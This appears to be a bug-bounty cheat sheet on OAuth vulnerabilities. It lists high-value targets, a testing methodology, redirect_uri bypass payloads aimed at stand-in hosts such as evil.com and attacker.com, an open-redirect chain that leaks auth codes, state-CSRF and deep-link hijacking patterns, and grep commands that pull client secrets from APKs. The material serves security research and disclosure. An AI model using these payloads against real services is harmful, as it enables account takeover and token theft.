# OAuth — 10 Disclosed Reports

---

## High-Signal Targets

- Consumer identity providers: Google, Facebook, PayPal
- Mobile apps with custom deep link handlers
- Multi-tenant SaaS social login flows
- Platforms with account linking or merging features

---

## Hunting Methodology

1. Enumerate OAuth entry points via spidering and APK decompilation
2. Map the complete OAuth flow, capture all parameters
3. Test `redirect_uri` validation (highest yield): host confusion, path traversal, parameter pollution
4. Validate `state` parameter handling against CSRF
5. Test nonce replay and validation
6. Verify authentication step completeness
7. Hunt referrer leakage via analytics and social widgets
8. Test mobile deep links for host validation failures
9. Check for exposed client credentials in code or APK
10. Verify findings with complete attack chain

---

## Paid Patterns

**redirect_uri bypass (most common root cause):**
```
# Weak: prefix matching only
https://target.com/callback  (legitimate)
https://target.com.evil.com/callback  (bypasses suffix check)
https://target.com/callback/../redirect?url=https://attacker.com  (path traversal)
https://target.com/callback%20  (encoding bypass)

# Chain with open redirect on legitimate domain
redirect_uri=https://target.com/redirect?url=https://attacker.com
# 1. redirect_uri passes validation (target.com is allowlisted)
# 2. Server issues code to target.com/redirect
# 3. target.com/redirect sends user to attacker.com with code in Referer
```

**State parameter CSRF:**
```
# Remove or fix state parameter
https://auth.target.com/oauth/authorize?client_id=X&redirect_uri=...&state=
# If server accepts missing/empty state, CSRF on authorization flow
```

**Referrer leakage:**
```html
<!-- Analytics or social widget on callback page leaks token in Referer header -->
<script src="https://analytics.com/track.js"></script>
<!-- After redirect: Referer: https://target.com/callback?code=AUTH_CODE&state=XYZ -->
```

**Mobile deep link hijacking:**
```
# Custom scheme registered by malicious app
myapp://oauth/callback?code=AUTH_CODE
# Malicious app registered same scheme, receives auth code
```

**Exposed client credentials:**
```bash
# Search APK or JS bundle
strings app.apk | grep -i "client_secret\|client_id"
grep -r "client_secret" dist/*.js
```

---

## Root Causes

- `redirect_uri` validated by prefix or suffix matching instead of exact match
- `state` parameter not generated, not validated, or not bound to session
- Referrer header not stripped before loading third-party analytics on callback page
- Mobile deep link handler accepts any registered scheme without verification
- Client secrets hardcoded in mobile APK or minified JS

---

## Real-World Scenarios

**PayPal/Venmo token theft:**
Push notification webviews rendered OAuth callback without stripping referrer. Token leaked to third-party analytics loaded on callback page.

**GitLab email-verification bypass:**
OAuth flow allowed skipping email verification step. Account created and verified without confirming email ownership.

**Rockstar Games referrer exfiltration:**
Analytics widget on OAuth callback page received full callback URL including auth code via Referer header. Affected millions of users.

---

## Pre-Submission Validation Gate

1. Complete attack chain demonstrated from unauthenticated to authenticated as victim?
2. Concrete victim loss: session access, linked accounts, payment methods?
3. Reproducible within 10 minutes from scratch?
